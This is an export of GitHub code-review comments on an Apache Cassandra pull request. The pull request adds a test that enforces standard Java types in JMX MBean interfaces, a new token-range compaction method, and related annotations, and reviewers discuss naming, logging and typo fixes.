+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package org.apache.cassandra.tools;
+
+import java.io.File;
+import java.io.IOException;
+import java.io.Serializable;
+import java.lang.reflect.Method;
+import java.lang.reflect.ParameterizedType;
+import java.lang.reflect.Type;
+import java.net.InetAddress;
+import java.net.UnknownHostException;
+import java.nio.ByteBuffer;
+import java.util.ArrayList;
+import java.util.Collection;
+import java.util.List;
+import java.util.Map;
+import java.util.Set;
+import java.util.SortedMap;
+import java.util.concurrent.ExecutionException;
+import java.util.concurrent.TimeoutException;
+import java.util.regex.Pattern;
+import java.util.stream.Collectors;
+import java.util.stream.Stream;
+
+import javax.management.ObjectName;
+import javax.management.openmbean.CompositeData;
+import javax.management.openmbean.OpenDataException;
+import javax.management.openmbean.TabularData;
+
+import com.google.common.collect.ImmutableSet;
+import org.junit.Assert;
+import org.junit.Test;
+
+import org.apache.cassandra.utils.BreaksJMX;
+import org.assertj.core.api.Assertions;
+import org.reflections.Reflections;
+import org.reflections.scanners.Scanners;
+import org.reflections.util.ConfigurationBuilder;
+
+public class JMXStandardsTest
+{
+    /**
+     * JMX typlically works well with java.* and javax.*, but not all types are serializable and will work, so this class
+     * goes with a explicit approval list, new APIs may fail if a java.* or javax.* is used not in this allow list, if
+     * that is the case it is fine to add here.
+     *
+     * It is never fine to allow non java.* and javax.* types, they can not be handled by clients, so should never be
+     * allowed.
+     */
+    private static Set<Class<?>> ALLOWED_TYPES = ImmutableSet.<Class<?>>builder()

Review Comment:
   Nit: could be `final`



##########
test/unit/org/apache/cassandra/tools/JMXStandardsTest.java:
##########
@@ -0,0 +1,180 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package org.apache.cassandra.tools;
+
+import java.io.File;
+import java.io.IOException;
+import java.io.Serializable;
+import java.lang.reflect.Method;
+import java.lang.reflect.ParameterizedType;
+import java.lang.reflect.Type;
+import java.net.InetAddress;
+import java.net.UnknownHostException;
+import java.nio.ByteBuffer;
+import java.util.ArrayList;
+import java.util.Collection;
+import java.util.List;
+import java.util.Map;
+import java.util.Set;
+import java.util.SortedMap;
+import java.util.concurrent.ExecutionException;
+import java.util.concurrent.TimeoutException;
+import java.util.regex.Pattern;
+import java.util.stream.Collectors;
+import java.util.stream.Stream;
+
+import javax.management.ObjectName;
+import javax.management.openmbean.CompositeData;
+import javax.management.openmbean.OpenDataException;
+import javax.management.openmbean.TabularData;
+
+import com.google.common.collect.ImmutableSet;
+import org.junit.Assert;
+import org.junit.Test;
+
+import org.apache.cassandra.utils.BreaksJMX;
+import org.assertj.core.api.Assertions;
+import org.reflections.Reflections;
+import org.reflections.scanners.Scanners;
+import org.reflections.util.ConfigurationBuilder;
+
+public class JMXStandardsTest
+{
+    /**
+     * JMX typlically works well with java.* and javax.*, but not all types are serializable and will work, so this class
+     * goes with a explicit approval list, new APIs may fail if a java.* or javax.* is used not in this allow list, if
+     * that is the case it is fine to add here.
+     *
+     * It is never fine to allow non java.* and javax.* types, they can not be handled by clients, so should never be
+     * allowed.
+     */
+    private static Set<Class<?>> ALLOWED_TYPES = ImmutableSet.<Class<?>>builder()
+                                                 .add(Void.class).add(Void.TYPE)
+                                                 .add(Boolean.class).add(Boolean.TYPE)
+                                                 .add(Byte.class).add(Byte.TYPE)
+                                                 .add(Short.class).add(Short.TYPE)
+                                                 .add(Integer.class).add(Integer.TYPE)
+                                                 .add(Long.class).add(Long.TYPE)
+                                                 .add(Float.class).add(Float.TYPE)
+                                                 .add(Double.class).add(Double.TYPE)
+                                                 .add(String.class)
+                                                 .add(ByteBuffer.class)
+                                                 .add(InetAddress.class)
+                                                 .add(File.class)
+                                                 .add(List.class).add(Map.class).add(Set.class).add(SortedMap.class).add(Collection.class)
+                                                 .add(ObjectName.class).add(TabularData.class).add(CompositeData.class)
+                                                 // Exceptions
+                                                 // https://www.oracle.com/java/technologies/javase/management-extensions-best-practices.html
+                                                 // ""It is recommended that exceptions thrown by MBeans be drawn from
+                                                 // the standard set defined in the java.* and javax.* packages on the
+                                                 // Java SE platform. If an MBean throws a non-standard exception, a
+                                                 // client that does not have that exception class will likely see
+                                                 // another exception such as ClassNotFoundException instead.""
+                                                 .add(ExecutionException.class)
+                                                 .add(InterruptedException.class)
+                                                 .add(UnknownHostException.class)
+                                                 .add(IOException.class)
+                                                 .add(TimeoutException.class)
+                                                 .add(IllegalStateException.class)
+                                                 .add(ClassNotFoundException.class)
+                                                 .add(OpenDataException.class)
+                                                 .build();
+    /**
+     * This list is a set of types under java.* and javax.*, but are too vague that could cause issues; this does not
+     * mean issues will happen with JMX, only that issues may happen only after running and can not be detected at
+     * compile time.
+     */
+    private static Set<Class<?>> DANGEROUS_TYPES = ImmutableSet.<Class<?>>builder()

Review Comment:
   Nit: could be `final`



;06/Apr/22 10:46;githubbot;600","adelapena commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r843802862


##########
test/unit/org/apache/cassandra/tools/JMXStandardsTest.java:
##########
@@ -0,0 +1,180 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package org.apache.cassandra.tools;
+
+import java.io.File;
+import java.io.IOException;
+import java.io.Serializable;
+import java.lang.reflect.Method;
+import java.lang.reflect.ParameterizedType;
+import java.lang.reflect.Type;
+import java.net.InetAddress;
+import java.net.UnknownHostException;
+import java.nio.ByteBuffer;
+import java.util.ArrayList;
+import java.util.Collection;
+import java.util.List;
+import java.util.Map;
+import java.util.Set;
+import java.util.SortedMap;
+import java.util.concurrent.ExecutionException;
+import java.util.concurrent.TimeoutException;
+import java.util.regex.Pattern;
+import java.util.stream.Collectors;
+import java.util.stream.Stream;
+
+import javax.management.ObjectName;
+import javax.management.openmbean.CompositeData;
+import javax.management.openmbean.OpenDataException;
+import javax.management.openmbean.TabularData;
+
+import com.google.common.collect.ImmutableSet;
+import org.junit.Assert;
+import org.junit.Test;
+
+import org.apache.cassandra.utils.BreaksJMX;
+import org.assertj.core.api.Assertions;
+import org.reflections.Reflections;
+import org.reflections.scanners.Scanners;
+import org.reflections.util.ConfigurationBuilder;
+
+public class JMXStandardsTest
+{
+    /**
+     * JMX typlically works well with java.* and javax.*, but not all types are serializable and will work, so this class
+     * goes with a explicit approval list, new APIs may fail if a java.* or javax.* is used not in this allow list, if
+     * that is the case it is fine to add here.
+     *
+     * It is never fine to allow non java.* and javax.* types, they can not be handled by clients, so should never be
+     * allowed.
+     */
+    private static Set<Class<?>> ALLOWED_TYPES = ImmutableSet.<Class<?>>builder()
+                                                 .add(Void.class).add(Void.TYPE)
+                                                 .add(Boolean.class).add(Boolean.TYPE)
+                                                 .add(Byte.class).add(Byte.TYPE)
+                                                 .add(Short.class).add(Short.TYPE)
+                                                 .add(Integer.class).add(Integer.TYPE)
+                                                 .add(Long.class).add(Long.TYPE)
+                                                 .add(Float.class).add(Float.TYPE)
+                                                 .add(Double.class).add(Double.TYPE)
+                                                 .add(String.class)
+                                                 .add(ByteBuffer.class)
+                                                 .add(InetAddress.class)
+                                                 .add(File.class)
+                                                 .add(List.class).add(Map.class).add(Set.class).add(SortedMap.class).add(Collection.class)
+                                                 .add(ObjectName.class).add(TabularData.class).add(CompositeData.class)
+                                                 // Exceptions
+                                                 // https://www.oracle.com/java/technologies/javase/management-extensions-best-practices.html
+                                                 // ""It is recommended that exceptions thrown by MBeans be drawn from
+                                                 // the standard set defined in the java.* and javax.* packages on the
+                                                 // Java SE platform. If an MBean throws a non-standard exception, a
+                                                 // client that does not have that exception class will likely see
+                                                 // another exception such as ClassNotFoundException instead.""
+                                                 .add(ExecutionException.class)
+                                                 .add(InterruptedException.class)
+                                                 .add(UnknownHostException.class)
+                                                 .add(IOException.class)
+                                                 .add(TimeoutException.class)
+                                                 .add(IllegalStateException.class)
+                                                 .add(ClassNotFoundException.class)
+                                                 .add(OpenDataException.class)
+                                                 .build();
+    /**
+     * This list is a set of types under java.* and javax.*, but are too vague that could cause issues; this does not
+     * mean issues will happen with JMX, only that issues may happen only after running and can not be detected at
+     * compile time.
+     */
+    private static Set<Class<?>> DANGEROUS_TYPES = ImmutableSet.<Class<?>>builder()
+                                                   .add(Object.class)
+                                                   .add(Comparable.class)
+                                                   .add(Serializable.class)
+                                                   .add(Exception.class)
+                                                   .build();
+    @Test
+    public void interfaces() throws ClassNotFoundException
+    {
+        Reflections reflections = new Reflections(ConfigurationBuilder.build(""org.apache.cassandra"").setExpandSuperTypes(false));
+        Pattern mbeanPattern = Pattern.compile("".*MBean$"");
+        Set<String> matches = reflections.getAll(Scanners.SubTypes).stream()
+                                         .filter(s -> mbeanPattern.matcher(s).find())
+                                         .collect(Collectors.toSet());
+
+        List<String> warnings = new ArrayList<>();
+        List<String> errors = new ArrayList<>();
+        for (String className : matches)
+        {
+            for (Class<?> klass = Class.forName(className); klass != null && !Object.class.equals(klass); klass = klass.getSuperclass())
+            {
+                Assertions.assertThat(klass).isInterface();
+                Method[] methods = klass.getDeclaredMethods();
+                for (int i = 0; i < methods.length; i++)
+                {
+                    Method method = methods[i];
+                    checkType(method, ""return"", method.getGenericReturnType(), warnings, errors);
+                    Stream.of(method.getGenericParameterTypes()).forEach(t -> checkType(method, ""parameter"", t, warnings, errors));
+                    Stream.of(method.getGenericExceptionTypes()).forEach(t -> checkType(method, ""throws"", t, warnings, errors));
+                }
+            }
+        }
+        if (!warnings.isEmpty())
+            System.err.println(String.join(""\n"", warnings));

Review Comment:
   Why don't we produce multiple error messages? Shouldn't we emit log warnings instead?



;06/Apr/22 10:56;githubbot;600","dcapwell commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r844136501


##########
src/java/org/apache/cassandra/db/DisallowedDirectories.java:
##########
@@ -49,14 +50,21 @@ private DisallowedDirectories()
         MBeanWrapper.instance.registerMBean(this, MBEAN_NAME, MBeanWrapper.OnException.LOG);
     }
 
-    public Set<File> getUnreadableDirectories()
+    @Override
+    public Set<java.io.File> getUnreadableDirectories()

Review Comment:
   Spoke in Slack, he was cool with me allowing java file



;06/Apr/22 16:14;githubbot;600","belliottsmith commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r844138299


##########
src/java/org/apache/cassandra/db/DisallowedDirectories.java:
##########
@@ -49,14 +50,21 @@ private DisallowedDirectories()
         MBeanWrapper.instance.registerMBean(this, MBEAN_NAME, MBeanWrapper.OnException.LOG);
     }
 
-    public Set<File> getUnreadableDirectories()
+    @Override
+    public Set<java.io.File> getUnreadableDirectories()

Review Comment:
   yes, this was a mistake made in CEP-10 when `java.io.File` was replaced - it should have been excluded from the change.



;06/Apr/22 16:16;githubbot;600","dcapwell commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r844138935


##########
src/java/org/apache/cassandra/db/ColumnFamilyStoreMBean.java:
##########
@@ -53,6 +54,7 @@
     /**
      * force a major compaction of specified key range in this column family
      */
+    @BreaksJMX(""This API was released in 3.10 using a parameter that takes Range of Token, which can only be done IFF client has Cassandra binaries in the classpath"")

Review Comment:
   sent out an email on the dev list to figure out what is best; waiting on that to touch these methods, so far only @ekaterinadimitrova2 has replied, and her feedback matches yours (fork)



;06/Apr/22 16:17;githubbot;600","dcapwell commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r844139732


##########
src/java/org/apache/cassandra/service/StorageServiceMBean.java:
##########
@@ -828,18 +829,22 @@ public StageConcurrency(int corePoolSize, int maximumPoolSize)
     /** Clears the history of clients that have connected in the past **/
     void clearConnectionHistory();
     public void disableAuditLog();
+    @BreaksJMX(""This API was exposed as throwing ConfigurationException, removing is binary compatible but not source; see https://docs.oracle.com/javase/specs/jls/se7/html/jls-13.html"")
     public void enableAuditLog(String loggerName, Map<String, String> parameters, String includedKeyspaces, String excludedKeyspaces, String includedCategories, String excludedCategories,
                                String includedUsers, String excludedUsers, Integer maxArchiveRetries, Boolean block, String rollCycle,
                                Long maxLogSize, Integer maxQueueWeight, String archiveCommand) throws ConfigurationException, IllegalStateException;
 
+    @BreaksJMX(""This API was exposed as throwing ConfigurationException, removing is binary compatible but not source; see https://docs.oracle.com/javase/specs/jls/se7/html/jls-13.html"")
     @Deprecated
     public void enableAuditLog(String loggerName, Map<String, String> parameters, String includedKeyspaces, String excludedKeyspaces, String includedCategories, String excludedCategories,
                                String includedUsers, String excludedUsers) throws ConfigurationException, IllegalStateException;
 
+    @BreaksJMX(""This API was exposed as throwing ConfigurationException, removing is binary compatible but not source; see https://docs.oracle.com/javase/specs/jls/se7/html/jls-13.html"")
     @Deprecated
     public void enableAuditLog(String loggerName, String includedKeyspaces, String excludedKeyspaces, String includedCategories, String excludedCategories,
                                String includedUsers, String excludedUsers) throws ConfigurationException, IllegalStateException;
 
+    @BreaksJMX(""This API was exposed as throwing ConfigurationException, removing is binary compatible but not source; see https://docs.oracle.com/javase/specs/jls/se7/html/jls-13.html"")

Review Comment:
   oh, I might have missed that when looking at git history, prob got confused with the deprecated versions!  Ill double check and fix



;06/Apr/22 16:18;githubbot;600","dcapwell commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r844141678


##########
test/unit/org/apache/cassandra/tools/JMXStandardsTest.java:
##########
@@ -0,0 +1,180 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package org.apache.cassandra.tools;
+
+import java.io.File;
+import java.io.IOException;
+import java.io.Serializable;
+import java.lang.reflect.Method;
+import java.lang.reflect.ParameterizedType;
+import java.lang.reflect.Type;
+import java.net.InetAddress;
+import java.net.UnknownHostException;
+import java.nio.ByteBuffer;
+import java.util.ArrayList;
+import java.util.Collection;
+import java.util.List;
+import java.util.Map;
+import java.util.Set;
+import java.util.SortedMap;
+import java.util.concurrent.ExecutionException;
+import java.util.concurrent.TimeoutException;
+import java.util.regex.Pattern;
+import java.util.stream.Collectors;
+import java.util.stream.Stream;
+
+import javax.management.ObjectName;
+import javax.management.openmbean.CompositeData;
+import javax.management.openmbean.OpenDataException;
+import javax.management.openmbean.TabularData;
+
+import com.google.common.collect.ImmutableSet;
+import org.junit.Assert;
+import org.junit.Test;
+
+import org.apache.cassandra.utils.BreaksJMX;
+import org.assertj.core.api.Assertions;
+import org.reflections.Reflections;
+import org.reflections.scanners.Scanners;
+import org.reflections.util.ConfigurationBuilder;
+
+public class JMXStandardsTest
+{
+    /**
+     * JMX typlically works well with java.* and javax.*, but not all types are serializable and will work, so this class
+     * goes with a explicit approval list, new APIs may fail if a java.* or javax.* is used not in this allow list, if
+     * that is the case it is fine to add here.
+     *
+     * It is never fine to allow non java.* and javax.* types, they can not be handled by clients, so should never be
+     * allowed.
+     */
+    private static Set<Class<?>> ALLOWED_TYPES = ImmutableSet.<Class<?>>builder()
+                                                 .add(Void.class).add(Void.TYPE)
+                                                 .add(Boolean.class).add(Boolean.TYPE)
+                                                 .add(Byte.class).add(Byte.TYPE)
+                                                 .add(Short.class).add(Short.TYPE)
+                                                 .add(Integer.class).add(Integer.TYPE)
+                                                 .add(Long.class).add(Long.TYPE)
+                                                 .add(Float.class).add(Float.TYPE)
+                                                 .add(Double.class).add(Double.TYPE)
+                                                 .add(String.class)
+                                                 .add(ByteBuffer.class)
+                                                 .add(InetAddress.class)
+                                                 .add(File.class)
+                                                 .add(List.class).add(Map.class).add(Set.class).add(SortedMap.class).add(Collection.class)
+                                                 .add(ObjectName.class).add(TabularData.class).add(CompositeData.class)
+                                                 // Exceptions
+                                                 // https://www.oracle.com/java/technologies/javase/management-extensions-best-practices.html
+                                                 // ""It is recommended that exceptions thrown by MBeans be drawn from
+                                                 // the standard set defined in the java.* and javax.* packages on the
+                                                 // Java SE platform. If an MBean throws a non-standard exception, a
+                                                 // client that does not have that exception class will likely see
+                                                 // another exception such as ClassNotFoundException instead.""
+                                                 .add(ExecutionException.class)
+                                                 .add(InterruptedException.class)
+                                                 .add(UnknownHostException.class)
+                                                 .add(IOException.class)
+                                                 .add(TimeoutException.class)
+                                                 .add(IllegalStateException.class)
+                                                 .add(ClassNotFoundException.class)
+                                                 .add(OpenDataException.class)
+                                                 .build();
+    /**
+     * This list is a set of types under java.* and javax.*, but are too vague that could cause issues; this does not
+     * mean issues will happen with JMX, only that issues may happen only after running and can not be detected at
+     * compile time.
+     */
+    private static Set<Class<?>> DANGEROUS_TYPES = ImmutableSet.<Class<?>>builder()
+                                                   .add(Object.class)
+                                                   .add(Comparable.class)
+                                                   .add(Serializable.class)
+                                                   .add(Exception.class)
+                                                   .build();
+    @Test
+    public void interfaces() throws ClassNotFoundException
+    {
+        Reflections reflections = new Reflections(ConfigurationBuilder.build(""org.apache.cassandra"").setExpandSuperTypes(false));
+        Pattern mbeanPattern = Pattern.compile("".*MBean$"");
+        Set<String> matches = reflections.getAll(Scanners.SubTypes).stream()
+                                         .filter(s -> mbeanPattern.matcher(s).find())
+                                         .collect(Collectors.toSet());
+
+        List<String> warnings = new ArrayList<>();
+        List<String> errors = new ArrayList<>();
+        for (String className : matches)
+        {
+            for (Class<?> klass = Class.forName(className); klass != null && !Object.class.equals(klass); klass = klass.getSuperclass())
+            {
+                Assertions.assertThat(klass).isInterface();
+                Method[] methods = klass.getDeclaredMethods();
+                for (int i = 0; i < methods.length; i++)
+                {
+                    Method method = methods[i];
+                    checkType(method, ""return"", method.getGenericReturnType(), warnings, errors);
+                    Stream.of(method.getGenericParameterTypes()).forEach(t -> checkType(method, ""parameter"", t, warnings, errors));
+                    Stream.of(method.getGenericExceptionTypes()).forEach(t -> checkType(method, ""throws"", t, warnings, errors));
+                }
+            }
+        }
+        if (!warnings.isEmpty())
+            System.err.println(String.join(""\n"", warnings));

Review Comment:
   Replacing with
   
   ```
   warnings.forEach(logger::warn);
   ```



;06/Apr/22 16:20;githubbot;600","dcapwell commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r844144426


##########
src/java/org/apache/cassandra/service/StorageServiceMBean.java:
##########
@@ -828,18 +829,22 @@ public StageConcurrency(int corePoolSize, int maximumPoolSize)
     /** Clears the history of clients that have connected in the past **/
     void clearConnectionHistory();
     public void disableAuditLog();
+    @BreaksJMX(""This API was exposed as throwing ConfigurationException, removing is binary compatible but not source; see https://docs.oracle.com/javase/specs/jls/se7/html/jls-13.html"")
     public void enableAuditLog(String loggerName, Map<String, String> parameters, String includedKeyspaces, String excludedKeyspaces, String includedCategories, String excludedCategories,
                                String includedUsers, String excludedUsers, Integer maxArchiveRetries, Boolean block, String rollCycle,
                                Long maxLogSize, Integer maxQueueWeight, String archiveCommand) throws ConfigurationException, IllegalStateException;
 
+    @BreaksJMX(""This API was exposed as throwing ConfigurationException, removing is binary compatible but not source; see https://docs.oracle.com/javase/specs/jls/se7/html/jls-13.html"")
     @Deprecated
     public void enableAuditLog(String loggerName, Map<String, String> parameters, String includedKeyspaces, String excludedKeyspaces, String includedCategories, String excludedCategories,
                                String includedUsers, String excludedUsers) throws ConfigurationException, IllegalStateException;
 
+    @BreaksJMX(""This API was exposed as throwing ConfigurationException, removing is binary compatible but not source; see https://docs.oracle.com/javase/specs/jls/se7/html/jls-13.html"")
     @Deprecated
     public void enableAuditLog(String loggerName, String includedKeyspaces, String excludedKeyspaces, String includedCategories, String excludedCategories,
                                String includedUsers, String excludedUsers) throws ConfigurationException, IllegalStateException;
 
+    @BreaksJMX(""This API was exposed as throwing ConfigurationException, removing is binary compatible but not source; see https://docs.oracle.com/javase/specs/jls/se7/html/jls-13.html"")

Review Comment:
   Confirmed, they were added in CASSANDRA-16725
   
   ```
   commit b286639eea11b5f6ee709711d00d36aa029bc114
   Author: Stefan Miklosovic <smiklosovic@apache.org>
   Date:   Wed Jul 28 14:57:02 2021 +0200
   
       implement getauditlog command
   
       patch by Stefan Miklosovic; reviewed by Ekaterina Dimitrova, Mick Semb Wever for CASSANDRA-16725
   
   diff --git a/src/java/org/apache/cassandra/service/StorageServiceMBean.java b/src/java/org/apache/cassandra/service/StorageServiceMBean.java
   index a5a66073a5..4622d06306 100644
   -;06/Apr/22 16:22;githubbot;600","ekaterinadimitrova2 commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r844146575


##########
src/java/org/apache/cassandra/db/ColumnFamilyStoreMBean.java:
##########
@@ -53,6 +54,7 @@
     /**
      * force a major compaction of specified key range in this column family
      */
+    @BreaksJMX(""This API was released in 3.10 using a parameter that takes Range of Token, which can only be done IFF client has Cassandra binaries in the classpath"")

Review Comment:
   Yeah, I think we can mark as @Deprecated the old ones, without actually removing them, and add also new ones



;06/Apr/22 16:24;githubbot;600","dcapwell commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r845460743


##########
src/java/org/apache/cassandra/db/ColumnFamilyStoreMBean.java:
##########
@@ -53,6 +54,7 @@
     /**
      * force a major compaction of specified key range in this column family
      */
+    @BreaksJMX(""This API was released in 3.10 using a parameter that takes Range of Token, which can only be done IFF client has Cassandra binaries in the classpath"")

Review Comment:
   just pushed a `v2`.  We don't have the following `fn(range.toString()) == range`, so went with a ""simpler"" `token:token` string



;07/Apr/22 18:43;githubbot;600","adelapena commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r846016081


##########
src/java/org/apache/cassandra/db/ColumnFamilyStoreMBean.java:
##########
@@ -53,6 +54,7 @@
     /**
      * force a major compaction of specified key range in this column family
      */
+    @BreaksJMX(""This API was released in 3.10 using a parameter that takes Range of Token, which can only be done IFF client has Cassandra binaries in the classpath"")

Review Comment:
   Looks good. I guess that the `v2` part of the name is to avoid overloaded methods. Since the method is applied to multiple token ranges, maybe we can call it `forceCompactionForTokenRanges`, in plural, so we don't keep the `v2` forever? Feel free to ignore if you don't agree.



;08/Apr/22 11:27;githubbot;600","adelapena commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r846025556


##########
src/java/org/apache/cassandra/db/ColumnFamilyStore.java:
##########
@@ -2332,11 +2333,33 @@ public void forceMajorCompaction(boolean splitOutput)
         CompactionManager.instance.performMaximal(this, splitOutput);
     }
 
+    @Override
     public void forceCompactionForTokenRange(Collection<Range<Token>> tokenRanges) throws ExecutionException, InterruptedException
     {
         CompactionManager.instance.forceCompactionForTokenRange(this, tokenRanges);
     }
 
+    @Override
+    public void forceCompactionForTokenRangeV2(String... strings)
+    {
+        CompactionManager.instance.forceCompactionForTokenRange(this, toTokenRanges(DatabaseDescriptor.getPartitioner(), strings));
+    }
+
+    static Set<Range<Token>> toTokenRanges(IPartitioner partitioner, String... strings)
+    {
+        Token.TokenFactory tokenFactory = partitioner.getTokenFactory();
+        Set<Range<Token>> tokenRanges = new HashSet<>();
+        for (String str : strings)
+        {
+            String[] splits = str.split(TOKEN_DELIMITER);
+            assert splits.length == 2 : String.format(""Unable to parse token range %s; needs to have two tokens seperated by %s"", str, TOKEN_DELIMITER);

Review Comment:
   Nit: typo
   ```suggestion
               assert splits.length == 2 : String.format(""Unable to parse token range %s; needs to have two tokens separated by %s"", str, TOKEN_DELIMITER);
   ```



;08/Apr/22 11:40;githubbot;600","adelapena commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r846027750


##########
test/unit/org/apache/cassandra/db/ColumnFamilyStoreMBeanTest.java:
##########
@@ -0,0 +1,96 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package org.apache.cassandra.db;
+
+import java.util.Random;
+import java.util.Set;
+
+import com.google.common.collect.ImmutableSet;
+import org.junit.BeforeClass;
+import org.junit.Test;
+
+import org.apache.cassandra.config.DatabaseDescriptor;
+import org.apache.cassandra.dht.ByteOrderedPartitioner;
+import org.apache.cassandra.dht.IPartitioner;
+import org.apache.cassandra.dht.Murmur3Partitioner;
+import org.apache.cassandra.dht.OrderPreservingPartitioner;
+import org.apache.cassandra.dht.RandomPartitioner;
+import org.apache.cassandra.dht.Range;
+import org.apache.cassandra.dht.Token;
+import org.assertj.core.api.Assertions;
+import org.quicktheories.core.Gen;
+import org.quicktheories.impl.Constraint;
+
+import static org.assertj.core.api.Assertions.assertThat;
+import static org.quicktheories.QuickTheory.qt;
+
+public class ColumnFamilyStoreMBeanTest
+{
+    @BeforeClass
+    public static void setup()
+    {
+        // can't use client due to the fact thread pools startup and fail due to config issues
+        DatabaseDescriptor.daemonInitialization();
+    }
+
+    @Test
+    public void testToTokenRangesMurmur3Partitioner()
+    {
+        testToTokenRanges(Murmur3Partitioner.instance);
+    }
+
+    @Test
+    public void testToTokenRangesRandomPartitioner()
+    {
+        testToTokenRanges(RandomPartitioner.instance);
+    }
+
+    @Test
+    public void testToTokenRangesOrderPreservingPartitioner()
+    {
+        testToTokenRanges(OrderPreservingPartitioner.instance);
+    }
+
+    @Test
+    public void testToTokenRangesByteOrderedPartitioner()
+    {
+        testToTokenRanges(ByteOrderedPartitioner.instance);
+    }
+
+    private static void testToTokenRanges(IPartitioner partitioner)

Review Comment:
   Nit: we could include a check for the parsing error:
   ```java
   Assertions.assertThatThrownBy(() -> ColumnFamilyStore.toTokenRanges(partitioner, ""invalid""))
             .isInstanceOf(AssertionError.class)
             .hasMessageContaining(""Unable to parse token range invalid; needs to have two tokens separated by :"");
   ```



;08/Apr/22 11:43;githubbot;600","adelapena commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r846016081


##########
src/java/org/apache/cassandra/db/ColumnFamilyStoreMBean.java:
##########
@@ -53,6 +54,7 @@
     /**
      * force a major compaction of specified key range in this column family
      */
+    @BreaksJMX(""This API was released in 3.10 using a parameter that takes Range of Token, which can only be done IFF client has Cassandra binaries in the classpath"")

Review Comment:
   Looks good. I guess that the `v2` part of the name is to avoid overloaded methods. Since the method is applied to multiple token ranges, maybe we can call it `forceCompactionForTokenRanges`, in plural, so we don't keep the `*v2` name forever? Feel free to ignore if you don't agree.



;08/Apr/22 11:45;githubbot;600","dcapwell commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r846245638


##########
src/java/org/apache/cassandra/db/ColumnFamilyStoreMBean.java:
##########
@@ -53,6 +54,7 @@
     /**
      * force a major compaction of specified key range in this column family
      */
+    @BreaksJMX(""This API was released in 3.10 using a parameter that takes Range of Token, which can only be done IFF client has Cassandra binaries in the classpath"")

Review Comment:
   went with `s`



;08/Apr/22 15:26;githubbot;600","adelapena commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r846325031


##########
test/unit/org/apache/cassandra/db/ColumnFamilyStoreMBeanTest.java:
##########
@@ -0,0 +1,119 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package org.apache.cassandra.db;
+
+import java.util.Arrays;
+import java.util.Random;
+import java.util.Set;

Review Comment:
   Nit: unused import



##########
test/unit/org/apache/cassandra/db/ColumnFamilyStoreMBeanTest.java:
##########
@@ -0,0 +1,119 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
